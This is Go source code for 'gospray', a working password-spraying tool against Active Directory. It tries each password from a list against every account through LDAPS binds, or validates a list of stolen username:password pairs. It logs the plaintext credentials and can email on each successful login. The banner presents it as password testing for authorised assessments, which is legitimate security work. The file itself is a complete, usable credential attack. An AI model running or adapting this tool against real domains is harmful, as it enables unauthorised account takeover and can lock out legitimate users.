package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/wunderwuzzi23/wuzziutils/mailutil"
	ldap "gopkg.in/ldap.v3"
)

type configuration struct {
	accountsfile     string
	passwordfile     string
	validationfile   string
	domainController string
	verbose          bool
	dcCertificate    string
	tlsConfig        *tls.Config
	logfile          string
	maxWorkers       int
	sendmail         bool
}

type message struct {
	shutdown bool
	cred     credential
}

type credential struct {
	referenceID string
	accountname string
	password    string
}

// read a file line by line and add it to a string array
func readFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	lines := []string{}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

// Main
func main() {

	fmt.Println("*******************************************************")
	fmt.Println("***                    gospray                      ***")
	fmt.Println("***                                                 ***")
	fmt.Println("***        Active Directory Password Testing        ***")
	fmt.Println("***      Be aware of account lockout policies       ***")
	fmt.Println("***              Use at your own risk               ***")
	fmt.Println("***      WUNDERWUZZI, July 2019, MIT License        ***")
	fmt.Println("*******************************************************")
	fmt.Println()

	//Setup the basic configuration
	config := configuration{}
	flag.StringVar(&config.accountsfile, "accounts", "accounts.list", "Filename of the accounts to test. One account name per line.")
	flag.StringVar(&config.passwordfile, "passwords", "passwords.list", "Password file, one password per line.")
	flag.StringVar(&config.validationfile, "validatecreds", "", "Validation mode - single file with username,password to valdiate")
	flag.StringVar(&config.domainController, "dc", "ldaps://<yourdomain>.<corp>.<com>", "URL to your LDAP Server")
	flag.BoolVar(&config.verbose, "verbose", true, "Verbose errors")
	flag.StringVar(&config.dcCertificate, "dccert", "", "Public key from Domain Controller. To safely use TLS from non domain machine")
	flag.StringVar(&config.logfile, "logfile", "results.log", "Log file containing results and output")
	flag.IntVar(&config.maxWorkers, "workers", 2, "Number of concurrent worker routines")
	flag.BoolVar(&config.sendmail, "sendmail ", false, "Send mail when successful authentication happens (requires configuration)")
	flag.Parse()

	//setup logging
	logfile, err := os.OpenFile(config.logfile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("Error creating file: %v", err)
	}

	defer logfile.Close()
	logWriter := io.MultiWriter(os.Stdout, logfile)

	//by default go log. writes to stderr, overwriting this for simple logging
	log.SetOutput(logWriter)

	log.Println("gospray -- Configuration:")
	log.Println("=========================")
	log.Println("Accounts File    : " + config.accountsfile)
	log.Println("Passwords File   : " + config.passwordfile)
	log.Println("Validation File  : " + config.validationfile)
	log.Println("Domain Controller: " + config.domainController)
	//log.Println("Verbose Output:    " + config.verbose)
	log.Println("Domain CA        : " + config.dcCertificate)
	log.Println("Workers          : " + strconv.Itoa(config.maxWorkers))
	log.Println("Sending Emails   : " + strconv.FormatBool(config.sendmail))
	log.Println()

	//Custom DC certificate to load?
	if config.dcCertificate != "" {
		log.Printf("Loading DC cert from local file (%s)", config.dcCertificate)
		certs := x509.NewCertPool()

		pemCA, err := ioutil.ReadFile(config.dcCertificate)
		if err != nil {
			log.Fatal(err)
		}

		certs.AppendCertsFromPEM(pemCA)

		config.tlsConfig = &tls.Config{
			RootCAs: certs}
	}

	log.Println("TLS configuration complete.")

	//TODO: configure these for your mail account, by default sending mail is disabled
	mailutil.SetConfiguration("smtp-mail.outlook.com", 587, "", "accountpassword", "from", "to", config.sendmail)

	log.Print("Press ENTER to start test execution. ")
	bufio.NewReader(os.Stdin).ReadString('\n')

	log.Println("Starting.")

	var wg sync.WaitGroup
	workchannel := make(chan message, config.maxWorkers)

	wg.Add(config.maxWorkers)
	for i := 0; i < config.maxWorkers; i++ {
		go validate(&wg, workchannel, config)
	}

	//decide between validation mode and password spray mode here
	if config.validationfile != "" {
		log.Printf("Validation Mode. Will test the provided credentials file (csv format).")
		lines := readFile(config.validationfile)

		log.Println("***************** VALIDATION STARTING")
		mailutil.SendMail("Credential Validation Starting", "Good luck! :)")

		for idxLine, line := range lines {
			parts := strings.SplitN(line, ":", 2)
			account := parts[0]
			password := parts[1]

			refID := strconv.Itoa(idxLine)
			cred := credential{refID, account, password}

			m := message{false, cred}

			workchannel <- m

			//rest a little after each test
			time.Sleep(10 * time.Millisecond)
		}
	} else {
		//Spray Mode
		log.Println("Reading Input Files for account names and passwords.")
		accounts := readFile(config.accountsfile)
		passwords := readFile(config.passwordfile)

		for idxPwd, password := range passwords {

			log.Println("***************** NEW ROUND")
			mailutil.SendMail("New Round!", "Good luck! :)")

			for idxAccount, account := range accounts {
				var refID = strconv.Itoa(idxPwd) + "-" + strconv.Itoa(idxAccount)

				cred := credential{refID, account, password}
				m := message{false, cred}

				workchannel <- m
			}

			//rest a bit after each round
			time.Sleep(10 * time.Second)
		}
	}

	log.Printf("Approaching end of test space...")

	//cleanup
	for i := 0; i < config.maxWorkers; i++ {
		m := message{true, credential{}}
		workchannel <- m
	}

	log.Printf("Wrapping up.")
	wg.Wait()
	log.Printf("Done.")
}

func validate(wg *sync.WaitGroup, m <-chan message, config configuration) {
	defer wg.Done()

	work := <-m

	for !work.shutdown {

		cred := work.cred

		// retry count in case IP connectivy is flaky
		retry := 3

		for retry > 0 {

			connection, err := ldap.DialTLS("tcp", net.JoinHostPort(config.domainController, ldap.DefaultLdapsPort), config.tlsConfig)
			if err == nil {

				//bind to validate the credential
				//noticed that this seems to prefer a upn as accountname (not just alias/samAccountName)
				//so be aware to have the input file for accounts in account@domain.com form
				//test this first in your environment
				err = connection.Bind(cred.accountname, cred.password)
				if err != nil {
					log.Printf("%s -- %s::%s::Failed.", cred.referenceID, cred.accountname, cred.password)

					if config.verbose {
						fmt.Println(err)
					}
				} else {
					log.Printf("%s -- %s::%s::Success.", cred.referenceID, cred.accountname, cred.password)
					mailutil.SendMail(":) New Round!", "Good luck! :)")
				}

				retry = 0
				connection.Close()
			} else {
				retry--
				log.Printf("Error connecting to domain: %s (trying %d more time(s))", err, retry)
			}

			//sleep a little to back off
			time.Sleep(100 * time.Millisecond)
		}

		//wait for next message
		work = <-m
	}

}
